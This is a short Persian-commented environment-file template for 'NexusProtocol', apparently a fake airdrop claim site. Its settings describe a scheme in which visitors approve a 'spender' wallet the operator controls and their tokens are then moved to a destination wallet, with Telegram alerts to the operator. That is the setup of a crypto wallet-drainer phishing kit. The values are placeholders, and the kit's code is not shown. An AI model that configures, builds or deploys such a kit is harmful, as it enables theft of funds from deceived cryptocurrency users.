# ══════════════════════════════════════════════════════════
#  NexusProtocol — فایل تنظیمات
#  این فایل رو کپی کن به .env و مقادیر رو پر کن
# ══════════════════════════════════════════════════════════

# ── دامنه سایت ─────────────────────────────────────────────
# دامنه‌ای که DNS آن را به IP سرور اشاره داده (بدون https://)
# مثال: claim.nexusprotocol.com  یا  airdrop.mysite.io
DOMAIN=claim.example.com

# ── دیتابیس ────────────────────────────────────────────────
DB_PASSWORD=change_this_strong_password_123

# ── امنیت سایت ─────────────────────────────────────────────
SESSION_SECRET=change_this_to_random_64_char_string

# ── کیف‌پول ربات ───────────────────────────────────────────
# کلید خصوصی کیف‌پول executor (بدون 0x) — برای پرداخت gas
EXECUTOR_PRIVATE_KEY=your_private_key_here_without_0x

# آدرس عمومی همان کیف‌پول executor (با 0x)
# این همان آدرسی است که کاربر approve می‌کند
# از کلید خصوصی بالا به دست میاد — می‌تونی با MetaMask یا etherscan چک کنی
SPENDER_ADDRESS=0xYourExecutorWalletPublicAddress

# آدرس کیف‌پول که توکن‌ها بهش منتقل میشن (با 0x)
# می‌تونه همان SPENDER_ADDRESS باشه یا آدرس دیگه‌ای
DESTINATION_ADDRESS=0xYourDestinationWalletAddress

# ── بلاکچین ────────────────────────────────────────────────
RPC_URL=https://eth.llamarpc.com

# ── تلگرام (اختیاری ولی توصیه‌شده) ───────────────────────
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=
